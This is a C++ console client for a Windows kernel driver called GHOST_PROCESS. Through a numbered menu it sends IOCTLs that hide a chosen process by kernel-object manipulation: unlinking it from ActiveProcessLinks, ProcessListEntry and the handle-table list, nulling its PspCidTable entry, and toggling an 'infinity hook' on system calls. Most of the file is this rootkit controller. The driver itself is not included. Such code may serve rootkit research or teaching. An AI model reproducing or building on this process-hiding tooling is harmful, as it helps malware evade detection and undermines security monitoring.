#include <iostream>
#include <Windows.h>
#include <winioctl.h>

#define UNLINK_ACTIVEPROCESSLINKS CTL_CODE(FILE_DEVICE_UNKNOWN,   0x800,  METHOD_BUFFERED,FILE_ANY_ACCESS)
#define UNLINK_PROCESSLISTENTRY CTL_CODE(FILE_DEVICE_UNKNOWN,   0x801,  METHOD_BUFFERED,FILE_ANY_ACCESS)
#define UNLINK_HANDLETABLELIST CTL_CODE(FILE_DEVICE_UNKNOWN,   0x802,  METHOD_BUFFERED,FILE_ANY_ACCESS)
#define NULL_PSPCIDTABLE CTL_CODE(FILE_DEVICE_UNKNOWN,   0x803,  METHOD_BUFFERED,FILE_ANY_ACCESS)
#define ALL_DKOM CTL_CODE(FILE_DEVICE_UNKNOWN,   0x804,  METHOD_BUFFERED,FILE_ANY_ACCESS)
#define SET_PID CTL_CODE(FILE_DEVICE_UNKNOWN,   0x805,  METHOD_BUFFERED,FILE_ANY_ACCESS)
#define INFINITY_HOOK_ON CTL_CODE(FILE_DEVICE_UNKNOWN,   0x806,  METHOD_BUFFERED,FILE_ANY_ACCESS)
#define INFINITY_HOOK_OFF CTL_CODE(FILE_DEVICE_UNKNOWN,   0x807,  METHOD_BUFFERED,FILE_ANY_ACCESS)
#define SymLinkName L"\\\\.\\GHOST_PROCESS"

HANDLE hDevice;
DWORD pid = -1;
struct _IOCTL_DATA
{
    DWORD pid;
    DWORD result;
}IOCTL_DATA , *PIOCTL_DATA;

VOID menu() {
    std::cout << "Manipulated pid: " << pid << std::endl
              << "[0] set manipulated pid" << std::endl
              << "[1] unlink ActiveProcessLinks (in EPROCESS)" << std::endl
              << "[2] unlink ProcessListEntry (in EPROCESS's PCB)" << std::endl
              << "[3] unlink HandleTableList (in EPROCESS's ObjectTable)" << std::endl
              << "[4] null PspCidTable" << std::endl
              << "[5] 1 + 2 + 3 + 4" << std::endl
              << "[6] infinity hook on" << std::endl
              << "[7] infinity hook off" << std::endl;
}

int interact(DWORD ctl_code)
{
    DWORD dwWrite = 0;
    _IOCTL_DATA ioctl_data;
    ioctl_data.pid = pid;
    //傳送 IOCTL 給 Driver
    DeviceIoControl(hDevice, ctl_code,
        &ioctl_data, //Input Buffer
        sizeof(ioctl_data),
        &ioctl_data, //Output Buffer
        sizeof(ioctl_data), 
        &dwWrite, NULL);

    //ioctl_data.result 保存了從驅動回傳的結果.

    return ioctl_data.result;
}
int main(int argc, char* argv[])
{
    //透過 symbol name 連結 Driver
    hDevice =
            CreateFile(SymLinkName, //symbol name
            GENERIC_READ | GENERIC_WRITE,
            0,           // share mode none
            NULL,       // no security
            OPEN_EXISTING,
            FILE_ATTRIBUTE_SYSTEM,
            0 );            // no template

    if (hDevice == INVALID_HANDLE_VALUE)
    {
        std::cout << "Get Driver Handle Error with Win32 error code: " << GetLastError() << std::endl;
        system("pause");
        return 0;
    }

    DWORD choice;
    while (TRUE) {
        menu();
        std::cin >> choice;
        if (choice == 0) {
            std::cout << "pid: ";
            std::cin >> pid;
            interact(SET_PID);
        }
        else if (choice == 1) {
            interact(UNLINK_ACTIVEPROCESSLINKS);
        }
        else if (choice == 2) {
            interact(UNLINK_PROCESSLISTENTRY);
        }
        else if (choice == 3) {
            interact(UNLINK_HANDLETABLELIST);
        }
        else if (choice == 4) {
            interact(NULL_PSPCIDTABLE);
        }
        else if (choice == 5) {
            interact(ALL_DKOM);
        }
        else if (choice == 6) {
            interact(INFINITY_HOOK_ON);
        }
        else if (choice == 7) {
            interact(INFINITY_HOOK_OFF);
        }
    }
    return 0;
}